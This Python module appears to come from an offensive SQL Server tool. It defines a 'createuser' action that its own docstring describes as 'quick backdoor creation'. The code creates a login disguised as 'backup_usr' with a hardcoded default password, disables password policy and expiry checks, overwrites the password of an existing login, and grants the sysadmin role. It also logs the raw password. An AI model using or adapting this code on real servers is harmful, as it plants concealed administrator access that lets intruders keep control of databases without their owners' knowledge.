"""
CreateUser action for creating SQL Server logins with server role privileges.
"""

from typing import Optional

# Third party imports
from loguru import logger

from ..base import BaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext


@ActionFactory.register(
    "createuser", "Create a new SQL Server login with server role privileges"
)
class CreateUser(BaseAction):
    """
    Creates a new SQL Server login with specified server role privileges.

    This action creates a SQL login (not Windows authentication) and assigns
    it to a server role. Default credentials are provided for quick backdoor
    creation, but custom credentials can be specified.
    """

    def __init__(self):
        super().__init__()
        self._username: str = "backup_usr"
        self._password: str = "$ap3rlip0pe//e"
        self._role: str = "sysadmin"

    def validate_arguments(self, additional_arguments: str) -> None:
        """
        Validate and parse arguments for creating a user.

        Args:
            additional_arguments: Space-separated arguments:
                - username (default: backup_usr)
                - password (default: $ap3rlip0pe//e)
                - role (default: sysadmin)

        Examples:
            createuser
            createuser myuser mypass123
            createuser myuser mypass123 sysadmin
        """
        # Use the base action argument parser which supports
        # short (-u) and long (--username) flags as well as positional args
        named, positional = self._parse_action_arguments(additional_arguments)

        # Priority 1: named args (short or long)
        if "u" in named or "username" in named:
            self._username = named.get("u", named.get("username", self._username))

        if "p" in named or "password" in named:
            self._password = named.get("p", named.get("password", self._password))

        if "r" in named or "role" in named:
            self._role = named.get("r", named.get("role", self._role))

        # Priority 2: positional args (fallback)
        if not ("u" in named or "username" in named) and len(positional) > 0:
            self._username = positional[0]

        if not ("p" in named or "password" in named) and len(positional) > 1:
            self._password = positional[1]

        if not ("r" in named or "role" in named) and len(positional) > 2:
            self._role = positional[2]

        if not additional_arguments or not additional_arguments.strip():
            logger.info(
                f"Using default credentials: {self._username} with role: {self._role}"
            )

        # Validate inputs
        if not self._username or not self._username.strip():
            raise ValueError("Username cannot be empty")

        if not self._password or not self._password.strip():
            raise ValueError("Password cannot be empty")

        if not self._role or not self._role.strip():
            raise ValueError("Role cannot be empty")

    def execute(self, database_context: DatabaseContext) -> Optional[bool]:
        """
        Create a SQL Server login with the specified server role.

        Args:
            database_context: The database context

        Returns:
            True if successful, False otherwise
        """
        logger.info(f"Creating SQL login: {self._username} with {self._role} role")

        # Log the intended operation (avoid leaking sensitive data in higher logs)
        logger.info(f"Creating SQL login: {self._username} with {self._role} role")
        logger.debug(f"Password (raw): '{self._password}'")

        # Escape single quotes in password
        escaped_password = self._password.replace("'", "''")

        create_login_query = f"CREATE LOGIN [{self._username}] WITH PASSWORD = '{escaped_password}', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF;"

        try:
            res = database_context.query_service.execute_non_processing(
                create_login_query
            )
            # execute_non_processing returns -1 on error; if so, raise to handle below
            if res == -1:
                raise RuntimeError("create_login_failed")

            logger.success(f"SQL login '{self._username}' created successfully")
        except Exception as ex:
            msg = str(ex).lower()
            # If login already exists, update password instead
            if (
                "already exists" in msg
                or "already an object" in msg
                or "create login" in msg
                and "exists" in msg
            ):
                logger.warning(
                    f"SQL login '{self._username}' already exists. Updating password."
                )
                try:
                    alter_query = f"ALTER LOGIN [{self._username}] WITH PASSWORD = '{escaped_password}';"
                    database_context.query_service.execute_non_processing(alter_query)
                    logger.success(f"Password updated for '{self._username}'.")
                except Exception as ex2:
                    logger.error(f"Failed to update password for existing login: {ex2}")
                    return False
            else:
                logger.error(f"Failed to create SQL login: {ex}")
                if "permission" in msg or "denied" in msg:
                    logger.warning(
                        "You may not have sufficient privileges to create logins or assign server roles"
                    )
                return False

        # Now add the login to the server role
        logger.info(f"Adding '{self._username}' to {self._role} server role")
        add_role_query = (
            f"ALTER SERVER ROLE [{self._role}] ADD MEMBER [{self._username}];"
        )
        try:
            database_context.query_service.execute_non_processing(add_role_query)
            logger.success(
                f"'{self._username}' added to {self._role} role successfully"
            )
            return True
        except Exception as ex:
            msg = str(ex).lower()
            # Already a member
            if "already a member" in msg or "is already a member" in msg:
                logger.info(
                    f"'{self._username}' is already a member of {self._role} role."
                )
                return True

            if "permission" in msg or "denied" in msg:
                logger.error(f"Insufficient privileges: {ex}")
            else:
                logger.error(f"Failed to add user to role: {ex}")

            return False

    def get_arguments(self) -> list:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return [
            "Username for SQL login (default: backup_usr)",
            "Password for SQL login (default: $ap3rlip0pe//e)",
            "Server role to assign (default: sysadmin)",
        ]
